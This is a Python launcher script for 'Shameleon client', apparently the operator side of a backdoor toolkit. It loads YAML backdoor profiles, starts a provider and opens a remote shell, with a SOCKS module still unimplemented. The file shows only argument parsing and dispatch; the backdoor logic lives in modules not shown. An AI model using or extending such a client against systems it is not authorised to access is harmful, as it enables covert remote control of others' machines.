#!/bin/env python3
import argparse
import os

from shameleon_client.modules.shell import ShameleonShell
from shameleon_client.profile import Profile
from shameleon_client.providers.base import ShameleonProvider


def main():
    # ARGS PARSING
    parser = argparse.ArgumentParser("Shameleon client - v0.1")
    parser.add_argument(
        '-p',
        '--profile-dir',
        default='./profiles',
        help="Path to directory containing profiles",
    )
    parser.add_argument(
        'profile',
        type=str,
        help='Names of backdoor to use',
    )
    parser.add_argument(
        'module',
        type=str,
        choices=['shell', 'socks'],
        help='Names of module to run',
    )
    args = parser.parse_args()

    # Load profiles
    profiles: dict[str, Profile] = {}
    for file_name in os.listdir(args.profile_dir):
        ext = file_name.split('.')[-1].lower()
        if ext not in ['yaml', 'yml']:
            continue
        profile_path = os.path.join(args.profile_dir, file_name)
        profile = Profile.load(profile_path)
        profiles[profile.name] = profile
    print(f'[*] {len(profiles)} profiles loaded.')
    chosen_profile = profiles.get(args.profile)
    if chosen_profile is None:
        print(f'[!] Profile {args.profile} not found.')
        exit(1)
    print(f"[*] Using profile {chosen_profile.name}")

    # Start provider
    provider = ShameleonProvider.get_module_from_name(chosen_profile.provider_name)(chosen_profile)
    provider.start()

    if args.module == 'shell':
        shell = ShameleonShell(provider)
        shell.run()
    elif args.module == 'socks':
        raise NotImplementedError('SOCKS module not implemented yet ;)')


if __name__ == '__main__':
    main()
